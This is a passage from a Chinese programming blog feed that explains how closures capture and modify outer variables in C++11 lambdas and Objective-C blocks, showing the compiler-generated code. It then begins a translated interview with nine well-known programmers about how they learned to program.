<p>当匿名函数和non-local变量结合起来，就形成了闭包（个人看法）。<br />
这一段代码可以成功输出i的值。</p>
<p>我们把一样的逻辑搬到C++上：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int i = 1024;
auto func = [] { printf(&quot;%d\n&quot;, i); };
func();
</pre>
<p>GCC会输出：<span style="color: #808000;"><span style="color: #ff0000;">错误</span>：‘i’未被捕获</span>。可见在C++中无法直接捕获外围作用域的变量。</p>
<p>以BNF来表示Lambda表达式的上下文无关文法，存在：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
lambda-expression : lambda-introducer lambda-parameter-declarationopt compound-statement
lambda-introducer : [ lambda-captureopt ]
</pre>
<p>因此，方括号中还可以加入一些选项：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
[]        Capture nothing (or, a scorched earth strategy?)
[&amp;]       Capture any referenced variable by reference
[=]       Capture any referenced variable by making a copy
[=, &amp;foo] Capture any referenced variable by making a copy, but capture variable foo by reference
[bar]     Capture bar by making a copy; don&#039;t copy anything else
[this]    Capture the this pointer of the enclosing class
</pre>
<p>根据文法，对代码加以修改，使其能够成功运行：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
bash-3.2# vi testLambda.cpp
bash-3.2# g++-4.7 -std=c++11 testLambda.cpp -o testLambda
bash-3.2# ./testLambda
1024
bash-3.2# cat testLambda.cpp
#include &lt;iostream&gt;

using  namespace std;

int main()
{
     int i = 1024;
     auto func = [=] { printf(&quot;%d\n&quot;, i); };
     func();

     return 0;
}
bash-3.2#
</pre>
<h4>2. 从语法上看如何修改外部变量</h4>
<p>上面代码中使用了符号<span style="color: #ff0000;">=</span>，通过<span style="color: #808000;">拷贝方式</span>捕获了外部变量i。<br />
但是如果尝试在Lambda表达式中修改变量i：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
auto func = [=] { i = 0; printf(&quot;%d\n&quot;, i); };
</pre>
<p>会得到错误：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
testLambda.cpp: 在 lambda 函数中:
testLambda.cpp:9:24: 错误：向只读变量‘i’赋值
</pre>
<p>可见<em><span style="color: #808000;">通过拷贝方式捕获的外部变量是只读的</span></em>。Python中也有一个类似的经典case，个人觉得有相通之处：</p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">
x = 10
def foo():
    print(x)
    x += 1
foo()
</pre>
<p>这段代码会抛出<span style="color: #ff0000;">UnboundLocalError</span>错误，原因可以参见<a href="http://docs.python.org/faq/programming.html#why-am-i-getting-an-unboundlocalerror-when-the-variable-has-a-value" target="_blank">FAQ</a>。</p>
<p>在C++的闭包语法中，如果需要对外部变量的写权限，可以使用符号<span style="color: #ff0000;">&amp;</span>，通过<span style="color: #808000;"><em>引用方式</em></span>捕获：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int i = 1024;
auto func = [&amp;] { i = 0; printf(&quot;%d\n&quot;, i); };
func();
</pre>
<p>反过来，将修改外部变量的逻辑放到Objective-C代码中：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int i = 1024;
void (^blk)(void) = ^{ i = 0; printf(&quot;%d\n&quot;, i); };
blk();
</pre>
<p>会得到如下错误：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
main.m:14:29: error: variable is not assignable (missing __block type specifier)
    void (^blk)(void) = ^{ i++; printf(&quot;%d\n&quot;, i); };
                           ~^
1 error generated.
</pre>
<p>可见在block的语法中，默认捕获的外部变量也是只读的，如果要修改外部变量，需要使用<span style="color: #ff0000;">__block</span>类型指示符进行修饰。<br />
为什么呢？请继续往下看 ：）</p>
<h4>3. 从实现上看如何捕获外部变量</h4>
<p>闭包对于编程语言来说是一种语法糖，包括Block和Lambda，是为了方便程序员开发而引入的。因此，对Block特性的支持会落地在<span style="color: #808000;"><em>编译器前端</em></span>，中间代码将会是C语言。</p>
<p>先看如下代码会产生怎样的中间代码。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int main(int argc, const char * argv[])
{
    int i = 1024;
    void (^blk)(void) = ^{ printf(&quot;%d\n&quot;, i); };
    blk();

    return 0;
}
</pre>
<p>首先是<span style="color: #ff0000;">block结构体</span>的实现：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
#ifndef BLOCK_IMPL
#define BLOCK_IMPL
struct __block_impl {
    void *isa;
    int Flags;
    int Reserved;
    void *FuncPtr;
};
// 省略部分代码

#endif
</pre>
<p>第一个成员<span style="color: #ff0000;">isa</span>指针用来表示该结构体的类型，使其仍然处于Cocoa的对象体系中，类似Python对象系统中的PyObject。</p>
<p>第二、三个成员是标志位和保留位。</p>
<p>第四个成员是对应的“匿名函数”，在这个例子中对应函数：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
static void __main_block_func_0(struct __main_block_impl_0 *__cself) {
    int i = __cself-&gt;i; // bound by copy
    printf(&quot;%d\n&quot;, i);
}
</pre>
<p>函数__main_block_func_0引入了参数<span style="color: #808000;">__cself</span>，为struct __main_block_impl_0 *类型，从参数名称就可以看出它的功能类似于C++中的this指针或者Objective-C的self。<br />
而struct __main_block_impl_0的结构如下：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
struct __main_block_impl_0 {
    struct __block_impl impl;
    struct __main_block_desc_0* Desc;
    int i;
    __main_block_impl_0(void *fp, struct __main_block_desc_0 *desc, int _i, int flags=0) : i(_i) {
        impl.isa = &amp;_NSConcreteStackBlock;
        impl.Flags = flags;
        impl.FuncPtr = fp;
        Desc = desc;
    }
};
</pre>
<p>从__main_block_impl_0这个名称可以看出该结构体是为main函数中第零个block服务的，即示例代码中的blk；也可以猜到不同场景下的block对应的结构体不同，但本质上第一个成员一定是<span style="color: #808000;">struct __block_impl impl</span>，因为这个成员是block实现的基石。</p>
<p>结构体__main_block_impl_0又引入了一个新的结构体，也是中间代码里最后一个结构体：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
static struct __main_block_desc_0 {
    unsigned long reserved;
    unsigned long Block_size;
} __main_block_desc_0_DATA = { 0, sizeof(struct __main_block_impl_0)};
</pre>
<p>可以看出，这个描述性质的结构体包含的价值信息就是struct __main_block_impl_0的大小。</p>
<p>最后剩下main函数对应的中间代码：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int main(int argc, const char * argv[])
{
    int i = 1024;
    void (*blk)(void) = (void (*)(void))&amp;__main_block_impl_0((void *)__main_block_func_0, &amp;__main_block_desc_0_DATA, i);
    ((void (*)(struct __block_impl *))((struct __block_impl *)blk)-&gt;FuncPtr)((struct __block_impl *)blk);

    return 0;
}
</pre>
<p>从main函数对应的中间代码可以看出<span style="color: #ff0000;">执行block的本质</span>就是<span style="color: #808000;">以block结构体自身作为__cself参数</span>，这里对应__main_block_impl_0，<span style="color: #808000;">通过结构体成员FuncPtr函数指针调用对应的函数</span>，这里对应__main_block_func_0。</p>
<p>其中，局部变量i是以<span style="color: #808000;">值传递</span>的方式拷贝一份，作为__main_block_impl_0的构造函数的参数，并以初始化列表的形式赋值给其成员变量i。所以，基于这样的实现，不允许直接修改外部变量是合理的——因为按值传递根本改不到外部变量。</p>
<h4>4. 从实现上看如何修改外部变量（<span style="color: #ff0000;">__block</span>类型指示符）</h4>
<p>如果想要修改外部变量，则需要用<span style="color: #ff0000;">__block</span>来修饰：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int main(int argc, const char * argv[])
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 0; printf(&quot;%d\n&quot;, i); };
    blk();

    return 0;
}
</pre>
<p>此时再看中间代码，发现多了一个结构体：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
struct __Block_byref_i_0 {
    void *__isa;
    __Block_byref_i_0 *__forwarding;
    int __flags;
    int __size;
    int i;
};
</pre>
<p>于是，用__block修饰的int变量<span style="color: #808000;">i化身为</span>__Block_byref_i_0结构体的最后一个<span style="color: #808000;">成员变量</span>。</p>
<p>代码中blk对应的结构体也发生了变化：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
struct __main_block_impl_0 {
    struct __block_impl impl;
    struct __main_block_desc_0* Desc;
    __Block_byref_i_0 *i; // by ref
    __main_block_impl_0(void *fp, struct__main_block_desc_0 *desc, __Block_byref_i_0 *_i, int flags=0) : i(_i-&gt;__forwarding) {
        impl.isa = &amp;_NSConcreteStackBlock;
        impl.Flags = flags;
        impl.FuncPtr = fp;
        Desc = desc;
    }
};
</pre>
<p>__main_block_impl_0发生的变化就是int类型的成员变量i换成了__Block_byref_i_0 *类型，从名称可以看出现在要通过引用方式来捕获了。</p>
<p>对应的函数也不同了：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
static void __main_block_func_0(struct  __main_block_impl_0 *__cself) {
    __Block_byref_i_0 *i = __cself-&gt;i; // bound by ref
    (i-&gt;__forwarding-&gt;i) = 0; // 看起来很厉害的样子
    printf(&quot;%d\n&quot;, (i-&gt;__forwarding-&gt;i));
}
</pre>
<p>main函数也有了变动：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int main(int argc, const char * argv[])
{
    __block __Block_byref_i_0 i = {(void*)0,(__Block_byref_i_0 *)&amp;i, 0, sizeof(__Block_byref_i_0), 1024};
    void (*blk)(void) = (void (*)(void))&amp;__main_block_impl_0((void *)__main_block_func_0, &amp;__main_block_desc_0_DATA, (struct __Block_byref_i_0 *)&amp;i, 570425344);
    ((void (*)(struct __block_impl *))((struct __block_impl *)blk)-&gt;FuncPtr)((struct __block_impl *)blk);

    return 0;
}
</pre>
<p>前两行代码创建了两个关键结构体，特地高亮显示。</p>
<p>这里没有看__main_block_desc_0发生的变化，<em><span style="color: #808000;">放到后面讨论</span></em>。</p>
<p>使用<span style="color: #ff0000;">__block类型指示符的本质</span>就是引入了__Block_byref_<span style="color: #ff0000;">{$var_name}</span>_<span style="color: #ff0000;">{$index}</span>结构体，而被__block关键字修饰的变量就被放到这个结构体中。另外，block结构体通过引入__Block_byref_{$var_name}_{$index}指针类型的成员，得以间接访问到外部变量。</p>
<p>通过这样的设计，我们就可以修改外部作用域的变量了，再一次应了那句话：</p>
<blockquote><p>There is no problem in computer science that can’t be solved by adding another level of indirection.</p></blockquote>
<p>指针是我们最经常使用的间接手段，而这里的本质也是通过指针来间接访问，为什么要特地引入__Block_byref_{$var_name}_{$index}结构体，而不是直接使用int *来访问外部变量i呢？</p>
<p>另外，__Block_byref_{$var_name}_{$index}结构体中的<span style="color: #ff0000;">__forwarding</span>指针成员有何作用？</p>
<p>请继续往下看 ：）</p>
<h4>5. 背后的内存管理动作</h4>
<p>在Objective-C中，block特性的引入是<em><span style="color: #808000;">为了让程序员可以更简洁优雅地编写并发代码</span></em>（配合看起来像敏感词的GCD）。比较常见的就是将block作为函数参数传递，以供后续回调执行。</p>
<p>先看一段完整的、可执行的代码：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
#import &lt;Foundation/Foundation.h&gt;
#include &lt;pthread.h&gt;

typedef void (^DemoBlock)(void);

void test();
void *testBlock(void *blk);

int main(int argc, const char * argv[])
{
    printf(&quot;Before test()\n&quot;);
    test();
    printf(&quot;After test()\n&quot;);

    sleep(5);
    return 0;
}

void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 2048; printf(&quot;%d\n&quot;, i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)blk);
    printf(&quot;thread returns : %d\n&quot;, ret);

    sleep(3); // 这里睡眠1s的话，程序会崩溃
}

void *testBlock(void *blk)
{
    sleep(2);

    printf(&quot;testBlock : Begin to exec blk.\n&quot;);
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();

    return NULL;
}
</pre>
<p>在这个示例中，位于test()函数的block类型的变量blk就作为函数参数传递给testBlock。</p>
<p>正常情况下，这段代码可以成功运行，输出：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
Before test()
thread returns : 0
testBlock : Begin to exec blk.
2048
After test()
</pre>
<p>如果按照注释，将test()函数最后一行改为休眠1s的话，正常情况下程序会在输出如下结果后崩溃：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
Before test()
thread returns : 0
After test()
testBlock : Begin to exec blk.
</pre>
<p>从输出可以看出，当要执行blk的时候，test()已经执行完毕回到main函数中，对应的<span style="color: #808000;">函数栈也已经展开</span>，此时栈上的变量已经不存在了，继续访问导致崩溃——这也是不用int *直接访问外部变量i的原因。</p>
<h5>5.1 拷贝block结构体</h5>
<p>上文提到block结构体__block_impl的第一个成员是isa指针，使其成为NSObject的子类，所以我们可以通过相应的<span style="color: #808000;">内存管理机制</span>将其拷贝到堆上：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 2048; printf(&quot;%d\n&quot;, i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)[blk copy]);
    printf(&quot;thread returns : %d\n&quot;, ret);

    sleep(1);
}

void *testBlock(void *blk)
{
    sleep(2);

    printf(&quot;testBlock : Begin to exec blk.\n&quot;);
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();
    [demoBlk release];

    returnNULL;
}
</pre>
<p>再次执行，得到输出：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
Before test()
thread returns : 0
After test()
testBlock : Begin to exec blk.
2048
</pre>
<p>可以看出，在test()函数栈展开后，demoBlk仍然可以成功执行，这是由于blk对应的block结构体__main_block_impl_0已经在堆上了。<span style="color: #808000;">不过这还不够</span>——</p>
<h5>5.2 拷贝捕获的变量（<span style="color: #ff0000;">__block</span>变量）</h5>
<p>在拷贝block结构体的同时，还会将捕获的<span style="color: #ff0000;">__block</span>变量，即结构体__Block_byref_i_0，复制到堆上。这个任务落在前面没有讨论的__main_block_desc_0结构体身上：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
static void __main_block_copy_0(struct __main_block_impl_0*dst, struct __main_block_impl_0*src) {_Block_object_assign((void*)&amp;dst-&gt;i, (void*)src-&gt;i, 8/*BLOCK_FIELD_IS_BYREF*/);}

static void __main_block_dispose_0(struct __main_block_impl_0*src) {_Block_object_dispose((void*)src-&gt;i, 8/*BLOCK_FIELD_IS_BYREF*/);}

static struct __main_block_desc_0 {
    unsigned long reserved;
    unsigned long Block_size;
    void (*copy)(struct __main_block_impl_0*, struct __main_block_impl_0*);
    void (*dispose)(struct __main_block_impl_0*);
} __main_block_desc_0_DATA = { 0, sizeof(struct __main_block_impl_0), __main_block_copy_0, __main_block_dispose_0};
</pre>
<p>栈上的__main_block_impl_0结构体为src，堆上的__main_block_impl_0结构体为dst，当发生复制动作时，__main_block_copy_0函数会得到调用，将src的成员变量i，即__Block_byref_i_0结构体，也<span style="color: #808000;">复制到堆上</span>。</p>
<h5>5.3 __forwarding指针的作用</h5>
<p>当复制动作完成后，<span style="color: #808000;">栈上和堆上都存在</span>着__main_block_impl_0结构体。如果栈上、堆上的block结构体都对捕获的外部变量进行操作，会如何？</p>
<p>下面是一段示例代码：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i++; printf(&quot;%d\n&quot;, i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)[blk copy]);
    printf(&quot;thread returns : %d\n&quot;, ret);

    sleep(1);
    blk();
}

void *testBlock(void *blk)
{
    sleep(2);

    printf(&quot;testBlock : Begin to exec blk.\n&quot;);
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();
    [demoBlk release];

    returnNULL;
}
</pre>
<ol>
<li>在test()函数中调用pthread_create创建线程时，<span style="color: #808000;">blk被复制了一份到堆上</span>作为testBlock函数的参数。</li>
<li>test()函数中的<span style="color: #808000;">blk结构体位于栈中，在休眠1s后被执行</span>，对i进行自增动作。</li>
<li>testBlock函数在休眠2s后，<span style="color: #808000;">执行位于堆上的block结构体</span>，这里为demoBlk。</li>
</ol>
<p>上述代码执行后输出：</p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">
Before test()
thread returns : 0
1025
After test()
testBlock : Begin to exec blk.
1026
</pre>
<p>可见无论是栈上的还是堆上的block结构体，修改的都是<span style="color: #808000;">同一个__block变量</span>。</p>
<p>这就是前面提到的__forwarding指针成员的作用了：</p>
<p><span style="color: #ff0000;">起初</span>，栈上的__block变量的成员指针__forwarding指向__block变量本身，即栈上的__Block_byref_i_0结构体。</p>
<p><span style="color: #ff0000;">当__block变量被复制到堆上后</span>，栈上的__block变量的__forwarding成员会指向堆上的那一份拷贝，从而保持一致。</p>
<h4>参考资料：</h4>
<ul>
<li><a href="http://msdn.microsoft.com/en-us/library/dd293603.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd293603.aspx</a></li>
<li><a href="http://www.cprogramming.com/c++11/c++11-lambda-closures.html" target="_blank">http://www.cprogramming.com/c++11/c++11-lambda-closures.html</a></li>
<li><a href="http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html" target="_blank">http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html</a></li>
<li><a href="http://en.wikipedia.org/wiki/Closure_(computer_science)" target="_blank">http://en.wikipedia.org/wiki/Closure_(computer_science)</a></li>
</ul>
<p><!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/10/drawing-recursive-150x150.jpg" alt="如何读懂并写出装逼的函数式代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8309.html">C/C++语言中闭包的探究及比较</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8309.html/feed</wfw:commentRss>
			<slash:comments>76</slash:comments>
		
		
			</item>
		<item>
		<title>对九个超级程序员的采访</title>
		<link>https://coolshell.cn/articles/8275.html</link>
					<comments>https://coolshell.cn/articles/8275.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Fri, 14 Sep 2012 00:29:54 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[轶事趣闻]]></category>
		<category><![CDATA[Linus Torvalds]]></category>
		<category><![CDATA[Programmer]]></category>
		<category><![CDATA[程序员]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8275</guid>

					<description><![CDATA[<p>原文：《Q&#38;A With Nine Great Programmers》时间有限，我只能粗译，难免错误。 这篇访谈源自2006年，最先发布在波兰程序员 ...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8275.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8275.html">对九个超级程序员的采访</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>原文：《<a href="http://www.dodgycoder.net/2012/09/q-with-nine-great-programmers.html" target="_blank">Q&amp;A With Nine Great Programmers</a>》时间有限，我只能粗译，难免错误。</p>
<p><strong>这篇访谈源自2006年，最先发布在波兰程序员 Jaroslaw &#8220;sztywny&#8221; Rzeszótko (AKA &#8220;Stiff&#8221;) 的博客上。但是这篇博文现在找不到了。非常感谢他能授权我重新发布这个博文。</strong></p>
<p style="padding-left: 30px;"><em>在一个炎热无聊的下午，我突发奇想。我想通过电子邮件的方式对那些我非常感兴趣和非常敬重的程序员问10个问题。准备这10个问题我只花了5分钟，这些都是我个人想问他们的问题，所以，我基本上没想太多要问他们什么。最后两个问题和编程没有什么关系，我就是想问题这些人的一些兴趣爱好。另外，不是每一个人都想回答我的，这是我第一次做“访谈”，所以，我犯了一些错误，一些问题没有得到回答。不管怎么样，我得到了很多很有意思的内容，所以，这对我绝对是一次很有意义的经历。</em><br />
<em></em></p>
<p style="padding-left: 30px;"><em>并不是每一个人都回了我的邮件，也并不是每一个人都同意回答我的这些问题，也许在我发布这篇文章后我会得到那些回答，但是我已经迫不及待想把这些东西发布了，所以，我可能会更新这篇文章（更新：2006年3月8日，我收到了<em>Bjarne Stroustrup的回信</em>）</em></p>
<p><em>&#8212; Jaroslaw</em></p>
<h4>介绍</h4>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Linus_Torvalds"><strong>Linus Torvalds</strong></a> &#8211; <a href="http://linux.org/">Linux kernel</a> 作者。</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Dave_Thomas_(programmer)"><strong>Dave Thomas</strong></a> &#8211; &#8220;Pragmatic Programmer&#8221;(注：<a href="http://book.douban.com/subject/1417047/" target="_blank">douban</a>) 和 &#8220;Programming Ruby&#8221;(注：<a href="http://book.douban.com/subject/1422056/" target="_blank">douban</a>) 以及其它一些优秀书籍的作者。 你可以在 <a href="http://pragdave.pragprog.com/">这里</a> 读读他对编程的一些想法。</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/David_Heinemeier_Hansson"><strong>David Heinemeier Hansson</strong></a> &#8211;   <a href="http://rubyonrails.org/">Rails Framework</a> 作者- 一个目前最新最热的Web开发框架。他的blog在 <a href="http://david.heinemeierhansson.com/">这里</a>. （陈皓注：他也是<a title="37signals" href="http://en.wikipedia.org/wiki/37signals">37signals</a>的领导人之一）</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Steve_Yegge"><strong>Steve Yegge</strong></a> &#8211; 他可能并不那么知名，但是他给了很多有意思的回答。他有一个很火的关于编程的 <a href="http://steve-yegge.blogspot.com/">blog</a>，他也是游戏 &#8220;Wyvern&#8221; 的作者。（陈皓注：他最火的是去年在google+上<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">对google和amazon的吐槽</a>，06年他应该在google了）</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Peter_Norvig"><strong>Peter Norvig</strong></a> &#8211; Research Director at Google, 知名的 Lisper，AI书的著名作家，<a href="http://norvig.com/">个人主页</a>。</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Guido_Van_Rossum"><strong>Guido Van Rossum</strong></a> &#8211; <a href="http://python.org/">Python</a> 发明者。</li>
</ul>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Bjarne_Stroustrup"><strong>Bjarne Stroustrup</strong></a> &#8211; C++发明者， <a href="http://www.stroustrup.com/">个人主页</a>。</li>
</ul>
<ul>
<li><strong><a href="http://en.wikipedia.org/wiki/James_Gosling">James Gosling</a></strong> &#8211;  <a href="http://java.sun.com/">Java</a> 发明者。</li>
</ul>
<ul>
<li><strong><a href="http://en.wikipedia.org/wiki/Tim_bray">Tim Bray</a></strong> &#8211;  XML 和 Atom 规格说明书作者之一 <a href="http://www.tbray.org/ongoing/">个人博客</a> 。</li>
</ul>
<div><span id="more-8275"></span></div>
<h4>Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>在我17岁的时候，我在HP的计算器中用他们的RPN 栈语言自学编程的。在这之前，我尝试过学习编程一两次，但都没有学成。HP 28c 和 48g 的科学计算器是一个很牛的东西，而且还有不错的文档。我搞了一本3D图形的书，并很费力地把其中的Pascal语言转成RPN栈语言，并用48g写了一个3D的线框图渲染图。运行的还不错，在我买了PC和Turbo Pascal之后，我开始认真地学习编程。在我进入大学计算机科学专业之前，我已经是一个不错的程序员了。</p>
<p>我在华盛顿大学拿到了计算机科学学位，这绝对是有价值的，所以，我建议所有的程序员都应该得到计算机科学专业的学位。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我没有在学校里学过编程，我在主要是读我自己想读的书，或是就直接去编程 (一开始在 <a href="http://en.wikipedia.org/wiki/Commodore_VIC-20" target="_blank">Commodore VIC-20</a> 学编程， 然后是 <a href="http://en.wikipedia.org/wiki/Sinclair_QL" target="_blank">Sinclair QL</a>上编程)。</p>
<p>当然，我觉得上大学非常有用。我没有去一个工科大学，我上了赫尔辛基大学，这是一个比较偏理论的大学，所以，那里的教育并没有那么多的编程的东西（编程只是很少一部分），这里大多数的课程都倾向于教一些基础概念的东西，如：复杂性分析。看上去很无聊，甚至有点浪费时间，但是我还是觉得这些课有用，我对大多数课都还比较enjoy。所以，我觉得我可能在这些方面是一个比较好的程序员。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我学编程是从用HTML做我的第一个网页开始的。那时，我想当我的网页能动态地显示一些内容，所以，我选择了ASP和PHP。在做完这个网页后，我知道了怎么去编程，于是我开始我的计算机科学和商业管理学位的学习。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我是从高中和大学课程中学编程的，但是我还是觉得我自己学得更多。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>我是在高中学编程的。我完全地迷住了，我对编程爱得无法自拔，然后，我开始挑选那些提供软件开发课程的大学。最终，我去了伦敦大学的帝国学院。第二年我就开始学习软件开发的课程了，那绝对是非凡的，学生和教员在一起工作把教材做得更好，每一个人都可以从中学到很多。这些课程给了我难以置信和非常雄厚的软件开发背景。我在那里读到了博士，最后去创业了。</p>
<p>关于“我是怎么学编程的”这个问题，我的回答是“我现在还在学编程”。我认为好的程序员一生都在学编程。这并不是去学一门语言或是一个代码库，好的程序员会对他们的编程技艺一年又一年地精益求精。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>我去的那个大学有一个大型主机和很多不同的计算机课程。这对我很重要。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>起初，我是自学的。在我去上大学之前，我就找到了一份程序员的工作。但是我很高兴我去了大学，在那里有很多乐趣，最终我学到了博士。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我先上的是Aarhus大学， 然后是 剑桥大学(Cambridge)，这两个大学教了我很多很有用的东西，这些东西为了以后的工作打下了基础。另外，我对编程和钱的关系学得非常好——知道了真实世界的问题，正确性，维护性，准时交付，等等，这些比教育可能更重要。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>我本来想去做一个数学老师的。但是，那个学数学的大学要我去学几个计算机的课。</p>
<h4>Q 2: 你们觉得对程序员最重要的事是什么？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>沟通能力（写和说）。除非你可以让你的想法更有效率地传递出去，否则你不可能做得比编程更多的事。程序员应该疯狂地阅读，锻炼写作能力，参加一些写作培训课程，甚至锻炼在公开场合演讲的能力。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>It’s a thing I call &#8220;taste&#8221;. 有一件事，我把它叫做“品味”。</p>
<p>我倾向于不从熟练程度来评判那些和我工作过的人。这些人能非常艰苦地写出很多代码，但是我想从他们对别人的代码的反应做出评判，这样我们就可以明白他们自己写的代码怎么样，知道他们使用的方法怎么样。他们对别人的评判还告诉我，他们是不是有好的“品味”。是这样的，如果一个人没有“好的品味”，那么他一般不会很好的评判他人的代码，他自己写的代码通常也不会很好。</p>
